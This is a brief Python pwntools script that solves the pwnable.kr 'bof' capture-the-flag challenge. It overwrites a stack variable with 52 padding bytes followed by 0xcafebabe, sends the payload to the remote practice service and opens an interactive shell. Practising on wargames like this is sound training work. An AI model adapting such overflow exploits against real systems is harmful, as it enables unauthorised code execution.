from pwn import *

# (cat /tmp/bof ; cat) | nc pwnable.kr 9000

port = 9000

payload = "A" * 52 + p32(0xcafebabe)
print repr("%s" % payload)
#print "%s" % payload
#exit()

s = remote('pwnable.kr', port)
#s = process('./bof')

print s.recvline()

s.sendline(payload)
#print s.recvline()

s.interactive()

s.close()
